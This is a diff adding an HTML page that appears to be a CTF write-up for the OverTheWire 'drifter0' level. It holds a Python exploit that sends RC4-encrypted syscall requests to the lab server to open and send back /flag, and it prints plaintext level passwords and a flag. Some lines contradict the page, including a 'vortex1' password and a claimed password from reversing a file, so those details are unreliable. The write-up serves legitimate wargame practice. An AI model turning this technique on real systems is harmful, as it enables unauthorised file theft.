@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=6aacf4c090fc5e966ec687925a0bf39a46c3a14c">
+    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>drifter0 | Avishai’s CTF Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="drifter0" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="…" />
+<meta property="og:description" content="…" />
+<link rel="canonical" href="http://localhost:4000/CTF_writeups/overthewire/drifter/drifter0.html" />
+<meta property="og:url" content="http://localhost:4000/CTF_writeups/overthewire/drifter/drifter0.html" />
+<meta property="og:site_name" content="Avishai’s CTF Writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="drifter0" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"drifter0","url":"http://localhost:4000/CTF_writeups/overthewire/drifter/drifter0.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/CTF_writeups/">
+          <h1>Avishai's CTF Writeups</h1>
+        </a>
+        <h2>...</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <p>vortex1 password: <code class="language-plaintext highlighter-rouge">Gq#qu3bF3</code></p>
+
+<p>the code can be found here [level1.py]</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+
+<span class="c1"># ========== RC4 Implementation ==========
+</span><span class="k">def</span> <span class="nf">rc4</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">S</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span>
+    <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="p">[]</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)])</span> <span class="o">%</span> <span class="mi">256</span>
+        <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+
+    <span class="n">i</span> <span class="o">=</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+        <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span>
+        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span>
+        <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+        <span class="n">K</span> <span class="o">=</span> <span class="n">S</span><span class="p">[(</span><span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">]</span>
+        <span class="n">out</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">char</span> <span class="o">^</span> <span class="n">K</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+
+
+<span class="c1"># ========== Constants ==========
+</span><span class="n">REMOTE_IP</span> <span class="o">=</span> <span class="s">"drifter.labs.overthewire.org"</span>
+<span class="n">REMOTE_PORT</span> <span class="o">=</span> <span class="mi">22_200</span>
+
+<span class="n">SYS_read</span> <span class="o">=</span> <span class="mi">63</span>
+<span class="n">SYS_write</span> <span class="o">=</span> <span class="mi">64</span>
+<span class="n">SYS_openat</span> <span class="o">=</span> <span class="mi">56</span>
+<span class="n">SYS_exit</span> <span class="o">=</span> <span class="mi">93</span>
+<span class="n">SYS_sendfile</span> <span class="o">=</span> <span class="mi">71</span>
+
+<span class="c1"># Safe memory address
+</span><span class="n">ADDR</span> <span class="o">=</span> <span class="mh">0x100000</span>
+
+<span class="n">FILENAME</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"/flag</span><span class="se">\x00</span><span class="s">"</span>
+
+
+<span class="c1"># ========== Helpers ==========
+</span><span class="k">def</span> <span class="nf">derive_key</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
+    <span class="n">ip_bytes</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">inet_aton</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
+    <span class="n">port_bytes</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'&gt;H'</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">ip_bytes</span> <span class="o">+</span> <span class="n">port_bytes</span>
+
+
+<span class="k">def</span> <span class="nf">recv_exact</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
+    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">:</span>
+        <span class="n">chunk</span> <span class="o">=</span> <span class="n">sock</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="nb">ConnectionError</span><span class="p">(</span><span class="s">"Socket closed before receiving expected data"</span><span class="p">)</span>
+        <span class="n">data</span> <span class="o">+=</span> <span class="n">chunk</span>
+    <span class="k">return</span> <span class="n">data</span>
+
+
+<span class="k">def</span> <span class="nf">send_syscall</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">syscall_num</span><span class="p">,</span> <span class="n">arg1</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">arg2</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">arg3</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">arg4</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">arg5</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">arg6</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'&lt;9I'</span><span class="p">,</span> <span class="n">syscall_num</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">,</span> <span class="n">arg3</span><span class="p">,</span> <span class="n">arg4</span><span class="p">,</span> <span class="n">arg5</span><span class="p">,</span> <span class="n">arg6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="n">encrypted</span> <span class="o">=</span> <span class="n">rc4</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[DEBUG] syscall=</span><span class="si">{</span><span class="n">syscall_num</span><span class="si">}</span><span class="s">, args=</span><span class="si">{</span><span class="p">[</span><span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">,</span> <span class="n">arg3</span><span class="p">,</span> <span class="n">arg4</span><span class="p">,</span> <span class="n">arg5</span><span class="p">,</span> <span class="n">arg6</span><span class="p">]</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[DEBUG] encrypted: </span><span class="si">{</span><span class="n">encrypted</span><span class="p">.</span><span class="nb">hex</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    
+    <span class="n">sock</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">recv_exact</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+    <span class="n">retval</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">result</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="k">return</span> <span class="n">retval</span>
+
+
+<span class="c1"># ========== Main ==========
+</span><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="c1"># 1. Create local socket
+</span>    <span class="n">local</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
+    <span class="n">local</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="s">''</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+    <span class="n">local</span><span class="p">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">local_ip</span><span class="p">,</span> <span class="n">local_port</span> <span class="o">=</span> <span class="n">local</span><span class="p">.</span><span class="n">getsockname</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Local IP: </span><span class="si">{</span><span class="n">local_ip</span><span class="si">}</span><span class="s">, Port: </span><span class="si">{</span><span class="n">local_port</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="c1"># 2. Connect to remote
+</span>    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
+    <span class="n">sock</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">REMOTE_IP</span><span class="p">,</span> <span class="n">REMOTE_PORT</span><span class="p">))</span>
+    <span class="n">sock</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">local_ip</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">local_port</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+
+    <span class="c1"># 3. Accept connection from remote (after it connects back to us)
+</span>    <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">local</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Remote connected from </span><span class="si">{</span><span class="n">addr</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="c1"># 4. Derive key
+</span>    <span class="n">key</span> <span class="o">=</span> <span class="n">derive_key</span><span class="p">(</span><span class="n">local_ip</span><span class="p">,</span> <span class="n">local_port</span><span class="p">)</span>
+
+    <span class="c1"># 5. Send SYS_read(0, ADDR, len("/flag\x00")) to write filename into memory
+</span>    <span class="k">print</span><span class="p">(</span><span class="s">"[+] Writing filename to memory..."</span><span class="p">)</span>
+    <span class="n">send_syscall</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">SYS_read</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ADDR</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">FILENAME</span><span class="p">))</span>
+
+    <span class="c1"># 6. Send filename to remote stdin (via real socket, not syscall)
+</span>    <span class="n">conn</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">FILENAME</span><span class="p">)</span>
+
+    <span class="c1"># 7. Send SYS_openat(AT_FDCWD=0xffffff9c, filename_ptr=ADDR, flags=0)
+</span>    <span class="k">print</span><span class="p">(</span><span class="s">"[+] Opening file..."</span><span class="p">)</span>
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">send_syscall</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">SYS_openat</span><span class="p">,</span> <span class="mh">0xffffff9c</span><span class="p">,</span> <span class="n">ADDR</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Got file descriptor: </span><span class="si">{</span><span class="n">fd</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="c1"># 8. Send SYS_sendfile(stdout=1, input_fd=fd, offset=NULL, count=100)
+</span>    <span class="k">print</span><span class="p">(</span><span class="s">"[+] Sending file contents..."</span><span class="p">)</span>
+    <span class="n">send_syscall</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">SYS_sendfile</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
+
+    <span class="c1"># 9. Done - Exit cleanly
+</span>    <span class="k">print</span><span class="p">(</span><span class="s">"[+] Exiting"</span><span class="p">)</span>
+    <span class="n">send_syscall</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">SYS_exit</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<p>here we reversed the file, and saw the password is <code class="language-plaintext highlighter-rouge">eatmyshorts</code></p>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">8YpAQCAuKf</code></em></strong></p>
+
+      </section>
+    </div>
+  </body>
+</html>
